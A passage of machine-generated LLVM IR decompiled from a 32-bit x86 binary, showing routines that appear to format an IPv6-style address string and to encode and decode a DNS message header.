dec_label_pc_8051902:                             ; preds = %dec_label_pc_80518c1, %dec_label_pc_80518bc, %dec_label_pc_80518b3, %dec_label_pc_80518ae
  %v0_8051902 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8051902, i32* %stack_var_-112, align 4
  %v2_8051903 = mul i32 %v1_8051903, 4
  %v4_8051903 = add i32 %v3_8051903, %v2_8051903
  %v5_8051903 = inttoptr i32 %v4_8051903 to i32*
  %v6_8051903 = load i32, i32* %v5_8051903, align 4
  store i32 %v0_805190c, i32* %stack_var_-124, align 4
  %v4_805190d = call i32 @function_804b940(i32 %v0_805190c, i32 ptrtoint ([3 x i8]* @global_var_80549d1.210 to i32), i32 %v6_8051903)
  store i32 %v4_805190d, i32* %eax.global-to-local, align 4
  %v0_8051915 = load i32, i32* @ebx, align 4
  %v2_8051915 = add i32 %v0_8051915, %v4_805190d
  store i32 %v2_8051915, i32* @ebx, align 4
  br label %dec_label_pc_8051917

dec_label_pc_8051917:                             ; preds = %dec_label_pc_805189c, %dec_label_pc_80518a0, %dec_label_pc_8051902
  %stack_var_-116.0 = phi i32 [ %v6_8051903, %dec_label_pc_8051902 ], [ %stack_var_-116.152, %dec_label_pc_805189c ], [ %stack_var_-116.152, %dec_label_pc_80518a0 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80549d1.210, i32 0, i32 0), %dec_label_pc_8051902 ], [ %stack_var_-120.153, %dec_label_pc_805189c ], [ %stack_var_-120.153, %dec_label_pc_80518a0 ]
  %v0_80518a018 = phi i32 [ %v2_8051915, %dec_label_pc_8051902 ], [ %v0_80518aa54, %dec_label_pc_805189c ], [ %v1_80518a3, %dec_label_pc_80518a0 ]
  %v0_8051917 = load i32, i32* @esi, align 4
  %v1_8051917 = add i32 %v0_8051917, 1
  %v0_8051921.pre = load i32, i32* @edi, align 4
  store i32 %v1_8051917, i32* @esi, align 4
  %v7_805191b = icmp sgt i32 %v1_8051917, 7
  %v10_8051921 = icmp eq i32 %v0_8051921.pre, -1
  br i1 %v7_805191b, label %dec_label_pc_8051921, label %dec_label_pc_805188c

dec_label_pc_8051921:                             ; preds = %dec_label_pc_8051917
  br i1 %v10_8051921, label %dec_label_pc_8051932, label %dec_label_pc_8051926

dec_label_pc_8051926:                             ; preds = %dec_label_pc_8051921, %dec_label_pc_80518f2
  %v0_805192e = phi i32 [ %v0_80518a018, %dec_label_pc_8051921 ], [ %v3_80518fe, %dec_label_pc_80518f2 ]
  %v0_8051926 = phi i32 [ %v0_8051921.pre, %dec_label_pc_8051921 ], [ %v0_8051926.pre, %dec_label_pc_80518f2 ]
  %v1_8051926 = load i32, i32* @ebp, align 4
  %v2_8051926 = add i32 %v1_8051926, %v0_8051926
  store i32 %v2_8051926, i32* %eax.global-to-local, align 4
  %v9_8051929 = icmp eq i32 %v2_8051926, 8
  %v1_805192c = icmp eq i1 %v9_8051929, false
  br i1 %v1_805192c, label %dec_label_pc_8051932, label %dec_label_pc_805192e

dec_label_pc_805192e:                             ; preds = %dec_label_pc_8051926
  %v1_805192e = inttoptr i32 %v0_805192e to i8*
  store i8 58, i8* %v1_805192e, align 1
  %v0_8051931 = load i32, i32* @ebx, align 4
  %v1_8051931 = add i32 %v0_8051931, 1
  store i32 %v1_8051931, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051932

dec_label_pc_8051932:                             ; preds = %dec_label_pc_8051926, %dec_label_pc_8051921, %dec_label_pc_805192e
  %v0_8051936 = phi i32 [ %v0_805192e, %dec_label_pc_8051926 ], [ %v0_80518a018, %dec_label_pc_8051921 ], [ %v1_8051931, %dec_label_pc_805192e ]
  store i32 %v2_8051881, i32* %edx.global-to-local, align 4
  %v1_8051936 = add i32 %v0_8051936, 1
  store i32 %v1_8051936, i32* %eax.global-to-local, align 4
  %v1_8051939 = inttoptr i32 %v0_8051936 to i8*
  store i8 0, i8* %v1_8051939, align 1
  %v0_805193c = load i32, i32* %eax.global-to-local, align 4
  %v1_805193c = load i32, i32* %edx.global-to-local, align 4
  %v2_805193c = sub i32 %v0_805193c, %v1_805193c
  store i32 %v2_805193c, i32* @eax, align 4
  %tmp67 = icmp ugt i32 %v2_805193c, %arg4
  br i1 %tmp67, label %dec_label_pc_8051944, label %dec_label_pc_8051951

dec_label_pc_8051944:                             ; preds = %dec_label_pc_8051932
  %v0_8051944 = load i32, i32* %stack_var_-124, align 4
  %v1_8051944 = call i32 @function_804b7f4(i32 %v0_8051944)
  store i32 %v1_8051944, i32* %eax.global-to-local, align 4
  %v1_8051949 = inttoptr i32 %v1_8051944 to i32*
  store i32 28, i32* %v1_8051949, align 4
  br label %dec_label_pc_8051972

dec_label_pc_8051951:                             ; preds = %dec_label_pc_8051932
  %v0_8051951 = load i32, i32* @edi, align 4
  store i32 %v0_8051951, i32* %stack_var_-112, align 4
  store i32 %arg3, i32* %stack_var_-124, align 4
  %v3_805195b = inttoptr i32 %arg3 to i8*
  %v4_805195b = call i32 @function_804d1e8(i8* %v3_805195b, i32 %v2_8051881)
  store i32 %v4_805195b, i32* %eax.global-to-local, align 4
  store i32 %v4_805195b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051974

dec_label_pc_8051967:                             ; preds = %dec_label_pc_80517bd
  %v1_8051967 = call i32 @function_804b7f4(i32 %v0_80517b0)
  store i32 %v1_8051967, i32* %eax.global-to-local, align 4
  %v1_805196c = inttoptr i32 %v1_8051967 to i32*
  store i32 97, i32* %v1_805196c, align 4
  br label %dec_label_pc_8051972

dec_label_pc_8051972:                             ; preds = %dec_label_pc_8051944, %dec_label_pc_8051967
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051974

dec_label_pc_8051974:                             ; preds = %dec_label_pc_80518cb, %dec_label_pc_8051951, %dec_label_pc_80517c8, %dec_label_pc_8051972
  %v0_8051977 = phi i32 [ 0, %dec_label_pc_80518cb ], [ %v4_805195b, %dec_label_pc_8051951 ], [ %v3_80517d4, %dec_label_pc_80517c8 ], [ 0, %dec_label_pc_8051972 ]
  store i32 %v0_8051977, i32* %eax.global-to-local, align 4
  store i32 %v0_80517b0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051977

; uselistorder directives
  uselistorder i32 %v0_8051977, { 1, 0 }
  uselistorder i32 %v0_8051936, { 1, 0 }
  uselistorder i1 %v10_8051921, { 1, 0 }
  uselistorder i32 %v0_8051921.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8051917, { 1, 0, 2 }
  uselistorder i32 %v1_8051903, { 1, 0 }
  uselistorder i32 %v0_805190c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8051898, { 1, 0 }
  uselistorder i32 %v2_8051891, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.152, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.153, { 2, 1, 0 }
  uselistorder i32 %v0_80518aa54, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805189c55, { 2, 1, 0 }
  uselistorder i32 %v0_80518a656, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8051881, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805192117, { 1, 0 }
  uselistorder i32 %v1_8051876, { 1, 0 }
  uselistorder i32 %v0_8051876, { 1, 0, 2 }
  uselistorder i32 %v5_805187e, { 1, 2, 0 }
  uselistorder i32 %v1_8051859, { 0, 2, 1 }
  uselistorder i32 %v0_80518498, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805185412, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8051844, { 1, 0 }
  uselistorder i32 %v0_805186f58, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805186459, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805185961, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805181162, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80517b0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-124, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_804d1e8, { 3, 0, 1, 2, 4, 5 }
  uselistorder [3 x i8]* @global_var_80549d1.210, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 64, { 6, 2, 8, 3, 5, 7, 1, 4, 0 }
  uselistorder i32* @esp, { 0, 1, 25, 6, 26, 27, 28, 29, 30, 31, 7, 32, 33, 34, 35, 36, 37, 38, 9, 39, 40, 41, 42, 43, 15, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 11, 54, 55, 56, 12, 57, 8, 58, 59, 60, 61, 62, 63, 13, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 10, 77, 78, 79, 80, 81, 82, 14, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 105, 16, 106, 2, 3, 149, 4, 5, 17, 107, 108, 109, 110, 18, 111, 112, 113, 114, 21, 115, 116, 117, 22, 118, 23, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 20, 132, 24, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 19, 145, 146, 147, 148, 104 }
  uselistorder i32 15, { 0, 1, 4, 2, 3 }
  uselistorder i32 60, { 7, 8, 9, 10, 0, 11, 6, 2, 1, 3, 4, 5 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14 }
  uselistorder i32 (i8*, i32, i32)* @function_804d1d0, { 6, 3, 4, 5, 8, 12, 10, 11, 9, 0, 1, 2, 7 }
  uselistorder i32 (i32, i32, i32)* @function_805169c, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051974, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8051972, { 1, 0 }
  uselistorder label %dec_label_pc_8051932, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051917, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80518ae, { 1, 0 }
  uselistorder label %dec_label_pc_80518a6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805188c, { 1, 0 }
  uselistorder label %dec_label_pc_8051881, { 1, 0 }
  uselistorder label %dec_label_pc_8051871, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805186d, { 1, 0 }
  uselistorder label %dec_label_pc_8051859, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051856, { 1, 0 }
  uselistorder label %dec_label_pc_805182c, { 1, 0 }
}

define i32 @function_8051980() local_unnamed_addr {
dec_label_pc_8051980:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051984 = load i32, i32* @ebx, align 4
  store i32 %v0_8051984, i32* %stack_var_-8, align 4
  store i32 %tmp5, i32* %ebx.global-to-local, align 4
  %v4_805198e = ptrtoint i8* %tmp to i32
  store i32 %v4_805198e, i32* %esi.global-to-local, align 4
  %v7_8051992 = icmp sgt i32 %tmp6, 11
  br i1 %v7_8051992, label %dec_label_pc_8051998, label %dec_label_pc_8051a2c

dec_label_pc_8051998:                             ; preds = %dec_label_pc_8051980
  %v1_8051998 = add i32 %tmp5, 1
  %v2_8051998 = inttoptr i32 %v1_8051998 to i8*
  %v3_8051998 = load i8, i8* %v2_8051998, align 1
  store i8 %v3_8051998, i8* %tmp, align 1
  %v0_805199e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805199e = inttoptr i32 %v0_805199e to i32*
  %v2_805199e = load i32, i32* %v1_805199e, align 4
  %v1_80519a0 = trunc i32 %v2_805199e to i8
  %v2_80519a0 = load i32, i32* %esi.global-to-local, align 4
  %v3_80519a0 = add i32 %v2_80519a0, 1
  %v4_80519a0 = inttoptr i32 %v3_80519a0 to i8*
  store i8 %v1_80519a0, i8* %v4_80519a0, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_80519c5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519c5 = add i32 %v0_80519c5, 8
  %v2_80519c5 = inttoptr i32 %v1_80519c5 to i32*
  %v3_80519c5 = load i32, i32* %v2_80519c5, align 4
  %v1_80519c8 = mul i32 %v3_80519c5, 8
  %v2_80519cb = and i32 %v1_80519c8, 120
  %v2_80519ce = or i32 %v2_80519cb, 4
  store i32 %v2_80519ce, i32* %edx.global-to-local, align 4
  %v1_80519d0 = add i32 %v0_80519c5, 20
  %v2_80519d0 = inttoptr i32 %v1_80519d0 to i32*
  %v3_80519d0 = load i32, i32* %v2_80519d0, align 4
  %v4_80519d0 = icmp eq i32 %v3_80519d0, 0
  %v1_80519d4 = icmp eq i1 %v4_80519d0, false
  %v2_80519d4 = zext i1 %v1_80519d4 to i32
  %v2_80519d7 = or i32 %v2_80519d4, %v2_80519ce
  store i32 %v2_80519d7, i32* %edx.global-to-local, align 4
  %v2_80519d9 = or i32 %v2_80519d7, 130
  %v3_80519d9 = trunc i32 %v2_80519d9 to i8
  store i32 %v2_80519d9, i32* @ecx, align 4
  %v2_80519db = load i32, i32* %esi.global-to-local, align 4
  %v3_80519db = add i32 %v2_80519db, 2
  %v4_80519db = inttoptr i32 %v3_80519db to i8*
  store i8 %v3_80519d9, i8* %v4_80519db, align 1
  %v0_80519de = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519e2 = add i32 %v0_80519de, 28
  %v2_80519e2 = inttoptr i32 %v1_80519e2 to i8*
  %v3_80519e2 = load i8, i8* %v2_80519e2, align 1
  %v5_80519e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80519eb = urem i8 %v3_80519e2, 16
  %v7_80519eb = zext i8 %v2_80519eb to i32
  %v9_80519eb = and i32 %v5_80519e2, -256
  %v10_80519eb = or i32 %v9_80519eb, %v7_80519eb
  store i32 %v10_80519eb, i32* %edx.global-to-local, align 4
  %v2_80519ee = or i8 %v2_80519eb, -128
  %v2_80519f0 = load i32, i32* %esi.global-to-local, align 4
  %v3_80519f0 = add i32 %v2_80519f0, 3
  %v4_80519f0 = inttoptr i32 %v3_80519f0 to i8*
  store i8 %v2_80519ee, i8* %v4_80519f0, align 1
  %v0_80519f3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519f3 = add i32 %v0_80519f3, 33
  %v2_80519f3 = inttoptr i32 %v1_80519f3 to i8*
  %v3_80519f3 = load i8, i8* %v2_80519f3, align 1
  %v2_80519f7 = load i32, i32* %esi.global-to-local, align 4
  %v3_80519f7 = add i32 %v2_80519f7, 4
  %v4_80519f7 = inttoptr i32 %v3_80519f7 to i8*
  store i8 %v3_80519f3, i8* %v4_80519f7, align 1
  %v0_80519fa = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519fa = add i32 %v0_80519fa, 32
  %v2_80519fa = inttoptr i32 %v1_80519fa to i32*
  %v3_80519fa = load i32, i32* %v2_80519fa, align 4
  %v1_80519fd = trunc i32 %v3_80519fa to i8
  %v2_80519fd = load i32, i32* %esi.global-to-local, align 4
  %v3_80519fd = add i32 %v2_80519fd, 5
  %v4_80519fd = inttoptr i32 %v3_80519fd to i8*
  store i8 %v1_80519fd, i8* %v4_80519fd, align 1
  %v0_8051a00 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a00 = add i32 %v0_8051a00, 37
  %v2_8051a00 = inttoptr i32 %v1_8051a00 to i8*
  %v3_8051a00 = load i8, i8* %v2_8051a00, align 1
  %v2_8051a04 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051a04 = add i32 %v2_8051a04, 6
  %v4_8051a04 = inttoptr i32 %v3_8051a04 to i8*
  store i8 %v3_8051a00, i8* %v4_8051a04, align 1
  %v0_8051a07 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a07 = add i32 %v0_8051a07, 36
  %v2_8051a07 = inttoptr i32 %v1_8051a07 to i32*
  %v3_8051a07 = load i32, i32* %v2_8051a07, align 4
  %v1_8051a0a = trunc i32 %v3_8051a07 to i8
  %v2_8051a0a = load i32, i32* %esi.global-to-local, align 4
  %v3_8051a0a = add i32 %v2_8051a0a, 7
  %v4_8051a0a = inttoptr i32 %v3_8051a0a to i8*
  store i8 %v1_8051a0a, i8* %v4_8051a0a, align 1
  %v0_8051a0d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a0d = add i32 %v0_8051a0d, 41
  %v2_8051a0d = inttoptr i32 %v1_8051a0d to i8*
  %v3_8051a0d = load i8, i8* %v2_8051a0d, align 1
  %v2_8051a11 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051a11 = add i32 %v2_8051a11, 8
  %v4_8051a11 = inttoptr i32 %v3_8051a11 to i8*
  store i8 %v3_8051a0d, i8* %v4_8051a11, align 1
  %v0_8051a14 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a14 = add i32 %v0_8051a14, 40
  %v2_8051a14 = inttoptr i32 %v1_8051a14 to i32*
  %v3_8051a14 = load i32, i32* %v2_8051a14, align 4
  %v1_8051a17 = trunc i32 %v3_8051a14 to i8
  %v2_8051a17 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051a17 = add i32 %v2_8051a17, 9
  %v4_8051a17 = inttoptr i32 %v3_8051a17 to i8*
  store i8 %v1_8051a17, i8* %v4_8051a17, align 1
  %v0_8051a1a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a1a = add i32 %v0_8051a1a, 45
  %v2_8051a1a = inttoptr i32 %v1_8051a1a to i8*
  %v3_8051a1a = load i8, i8* %v2_8051a1a, align 1
  %v2_8051a1e = load i32, i32* %esi.global-to-local, align 4
  %v3_8051a1e = add i32 %v2_8051a1e, 10
  %v4_8051a1e = inttoptr i32 %v3_8051a1e to i8*
  store i8 %v3_8051a1a, i8* %v4_8051a1e, align 1
  %v0_8051a21 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a21 = add i32 %v0_8051a21, 44
  %v2_8051a21 = inttoptr i32 %v1_8051a21 to i32*
  %v3_8051a21 = load i32, i32* %v2_8051a21, align 4
  %v1_8051a24 = trunc i32 %v3_8051a21 to i8
  %v2_8051a24 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051a24 = add i32 %v2_8051a24, 11
  %v4_8051a24 = inttoptr i32 %v3_8051a24 to i8*
  store i8 %v1_8051a24, i8* %v4_8051a24, align 1
  %v2_8051a2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051a2c

dec_label_pc_8051a2c:                             ; preds = %dec_label_pc_8051980, %dec_label_pc_8051998
  %v2_8051a2c = phi i32 [ %v0_8051984, %dec_label_pc_8051980 ], [ %v2_8051a2c.pre, %dec_label_pc_8051998 ]
  %v0_8051a2e = phi i32 [ -1, %dec_label_pc_8051980 ], [ 12, %dec_label_pc_8051998 ]
  store i32 %v2_8051a2c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051a2e

; uselistorder directives
  uselistorder i32 45, { 3, 1, 2, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 1, 0, 2 }
  uselistorder i32 33, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a2c, { 1, 0 }
}

define i32 @function_8051a30() local_unnamed_addr {
dec_label_pc_8051a30:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a30 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a30, i32* %stack_var_-4, align 4
  %v4_8051a31 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8051a31, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8051a39 = load i8, i8* %tmp2, align 1
  %v3_8051a39 = zext i8 %v2_8051a39 to i32
  %v1_8051a3c = add i32 %v4_8051a31, 1
  %v2_8051a3c = inttoptr i32 %v1_8051a3c to i8*
  %v3_8051a3c = load i8, i8* %v2_8051a3c, align 1
  %v4_8051a3c = zext i8 %v3_8051a3c to i32
  %v2_8051a40 = mul nuw nsw i32 %v3_8051a39, 256
  %v2_8051a43 = or i32 %v4_8051a3c, %v2_8051a40
  %v2_8051a45 = inttoptr i32 %tmp to i32*
  store i32 %v2_8051a43, i32* %v2_8051a45, align 4
  %v0_8051a47 = load i32, i32* @ecx, align 4
  %v1_8051a47 = add i32 %v0_8051a47, 2
  %v2_8051a47 = inttoptr i32 %v1_8051a47 to i8*
  %v3_8051a47 = load i8, i8* %v2_8051a47, align 1
  %tmp6 = icmp slt i8 %v3_8051a47, 0
  %v2_8051a4b = zext i1 %tmp6 to i32
  %v1_8051a4e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a4e = add i32 %v1_8051a4e, 4
  %v3_8051a4e = inttoptr i32 %v2_8051a4e to i32*
  store i32 %v2_8051a4b, i32* %v3_8051a4e, align 4
  %v0_8051a51 = load i32, i32* @ecx, align 4
  %v1_8051a51 = add i32 %v0_8051a51, 2
  %v2_8051a51 = inttoptr i32 %v1_8051a51 to i8*
  %v3_8051a51 = load i8, i8* %v2_8051a51, align 1
  %v3_8051a54 = udiv i8 %v3_8051a51, 8
  %tmp7 = urem i8 %v3_8051a54, 16
  %v1_8051a57 = zext i8 %tmp7 to i32
  %v1_8051a5a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a5a = add i32 %v1_8051a5a, 8
  %v3_8051a5a = inttoptr i32 %v2_8051a5a to i32*
  store i32 %v1_8051a57, i32* %v3_8051a5a, align 4
  %v0_8051a5d = load i32, i32* @ecx, align 4
  %v1_8051a5d = add i32 %v0_8051a5d, 2
  %v2_8051a5d = inttoptr i32 %v1_8051a5d to i8*
  %v3_8051a5d = load i8, i8* %v2_8051a5d, align 1
  %div = udiv i8 %v3_8051a5d, 4
  %tmp8 = urem i8 %div, 2
  %v1_8051a64 = zext i8 %tmp8 to i32
  %v1_8051a67 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a67 = add i32 %v1_8051a67, 12
  %v3_8051a67 = inttoptr i32 %v2_8051a67 to i32*
  store i32 %v1_8051a64, i32* %v3_8051a67, align 4
  %v0_8051a6a = load i32, i32* @ecx, align 4
  %v1_8051a6a = add i32 %v0_8051a6a, 2
  %v2_8051a6a = inttoptr i32 %v1_8051a6a to i8*
  %v3_8051a6a = load i8, i8* %v2_8051a6a, align 1
  %div5 = udiv i8 %v3_8051a6a, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8051a70 = zext i8 %tmp9 to i32
  %v1_8051a73 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a73 = add i32 %v1_8051a73, 16
  %v3_8051a73 = inttoptr i32 %v2_8051a73 to i32*
  store i32 %v1_8051a70, i32* %v3_8051a73, align 4
  %v0_8051a76 = load i32, i32* @ecx, align 4
  %v1_8051a76 = add i32 %v0_8051a76, 2
  %v2_8051a76 = inttoptr i32 %v1_8051a76 to i8*
  %v3_8051a76 = load i8, i8* %v2_8051a76, align 1
  %tmp10 = urem i8 %v3_8051a76, 2
  %v1_8051a7a = zext i8 %tmp10 to i32
  %v1_8051a7d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a7d = add i32 %v1_8051a7d, 20
  %v3_8051a7d = inttoptr i32 %v2_8051a7d to i32*
  store i32 %v1_8051a7a, i32* %v3_8051a7d, align 4
  %v0_8051a80 = load i32, i32* @ecx, align 4
  %v1_8051a80 = add i32 %v0_8051a80, 3
  %v2_8051a80 = inttoptr i32 %v1_8051a80 to i8*
  %v3_8051a80 = load i8, i8* %v2_8051a80, align 1
  %tmp11 = icmp slt i8 %v3_8051a80, 0
  %v2_8051a84 = zext i1 %tmp11 to i32
  %v1_8051a87 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a87 = add i32 %v1_8051a87, 24
  %v3_8051a87 = inttoptr i32 %v2_8051a87 to i32*
  store i32 %v2_8051a84, i32* %v3_8051a87, align 4
  %v0_8051a8a = load i32, i32* @ecx, align 4
  %v1_8051a8a = add i32 %v0_8051a8a, 3
  %v2_8051a8a = inttoptr i32 %v1_8051a8a to i8*
  %v3_8051a8a = load i8, i8* %v2_8051a8a, align 1
  %tmp12 = urem i8 %v3_8051a8a, 16
  %v1_8051a8e = zext i8 %tmp12 to i32
  %v1_8051a91 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a91 = add i32 %v1_8051a91, 28
  %v3_8051a91 = inttoptr i32 %v2_8051a91 to i32*
  store i32 %v1_8051a8e, i32* %v3_8051a91, align 4
  %v0_8051a94 = load i32, i32* @ecx, align 4
  %v1_8051a94 = add i32 %v0_8051a94, 4
  %v2_8051a94 = inttoptr i32 %v1_8051a94 to i8*
  %v3_8051a94 = load i8, i8* %v2_8051a94, align 1
  %v4_8051a94 = zext i8 %v3_8051a94 to i32
  %v1_8051a98 = add i32 %v0_8051a94, 5
  %v2_8051a98 = inttoptr i32 %v1_8051a98 to i8*
  %v3_8051a98 = load i8, i8* %v2_8051a98, align 1
  %v4_8051a98 = zext i8 %v3_8051a98 to i32
  %v2_8051a9c = mul nuw nsw i32 %v4_8051a94, 256
  %v2_8051a9f = or i32 %v4_8051a98, %v2_8051a9c
  %v1_8051aa1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051aa1 = add i32 %v1_8051aa1, 32
  %v3_8051aa1 = inttoptr i32 %v2_8051aa1 to i32*
  store i32 %v2_8051a9f, i32* %v3_8051aa1, align 4
  %v0_8051aa4 = load i32, i32* @ecx, align 4
  %v1_8051aa4 = add i32 %v0_8051aa4, 6
  %v2_8051aa4 = inttoptr i32 %v1_8051aa4 to i8*
  %v3_8051aa4 = load i8, i8* %v2_8051aa4, align 1
  %v4_8051aa4 = zext i8 %v3_8051aa4 to i32
  %v1_8051aa8 = add i32 %v0_8051aa4, 7
  %v2_8051aa8 = inttoptr i32 %v1_8051aa8 to i8*
  %v3_8051aa8 = load i8, i8* %v2_8051aa8, align 1
  %v4_8051aa8 = zext i8 %v3_8051aa8 to i32
  %v2_8051aac = mul nuw nsw i32 %v4_8051aa4, 256
  %v2_8051aaf = or i32 %v4_8051aa8, %v2_8051aac
  %v1_8051ab1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ab1 = add i32 %v1_8051ab1, 36
  %v3_8051ab1 = inttoptr i32 %v2_8051ab1 to i32*
  store i32 %v2_8051aaf, i32* %v3_8051ab1, align 4
  %v0_8051ab4 = load i32, i32* @ecx, align 4
  %v1_8051ab4 = add i32 %v0_8051ab4, 8
  %v2_8051ab4 = inttoptr i32 %v1_8051ab4 to i8*
  %v3_8051ab4 = load i8, i8* %v2_8051ab4, align 1
  %v4_8051ab4 = zext i8 %v3_8051ab4 to i32
  %v1_8051ab8 = add i32 %v0_8051ab4, 9
  %v2_8051ab8 = inttoptr i32 %v1_8051ab8 to i8*
  %v3_8051ab8 = load i8, i8* %v2_8051ab8, align 1
  %v4_8051ab8 = zext i8 %v3_8051ab8 to i32
  %v2_8051abc = mul nuw nsw i32 %v4_8051ab4, 256
  %v2_8051abf = or i32 %v4_8051ab8, %v2_8051abc
  %v1_8051ac1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ac1 = add i32 %v1_8051ac1, 40
  %v3_8051ac1 = inttoptr i32 %v2_8051ac1 to i32*
  store i32 %v2_8051abf, i32* %v3_8051ac1, align 4
  %v0_8051ac4 = load i32, i32* @ecx, align 4
  %v1_8051ac4 = add i32 %v0_8051ac4, 10
  %v2_8051ac4 = inttoptr i32 %v1_8051ac4 to i8*
  %v3_8051ac4 = load i8, i8* %v2_8051ac4, align 1
  %v4_8051ac4 = zext i8 %v3_8051ac4 to i32
  %v1_8051ac8 = add i32 %v0_8051ac4, 11
  %v2_8051ac8 = inttoptr i32 %v1_8051ac8 to i8*
  %v3_8051ac8 = load i8, i8* %v2_8051ac8, align 1
  %v4_8051ac8 = zext i8 %v3_8051ac8 to i32
  %v2_8051acc = mul nuw nsw i32 %v4_8051ac4, 256
  %v2_8051acf = or i32 %v4_8051ac8, %v2_8051acc
  %v1_8051ad1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ad1 = add i32 %v1_8051ad1, 44
  %v3_8051ad1 = inttoptr i32 %v2_8051ad1 to i32*
  store i32 %v2_8051acf, i32* %v3_8051ad1, align 4
  %v2_8051ad9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ad9, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 6, 7, 1, 2, 5, 8, 3, 9, 10, 11, 12, 4, 13, 0 }
  uselistorder i32 40, { 4, 5, 9, 6, 7, 8, 2, 3, 10, 11, 12, 13, 1, 0 }
  uselistorder i32 7, { 7, 8, 1, 3, 5, 2, 0, 6, 10, 11, 12, 13, 14, 9, 4 }
  uselistorder i32 6, { 14, 15, 0, 1, 7, 17, 3, 11, 8, 9, 6, 16, 18, 4, 5, 2, 10, 12, 13 }
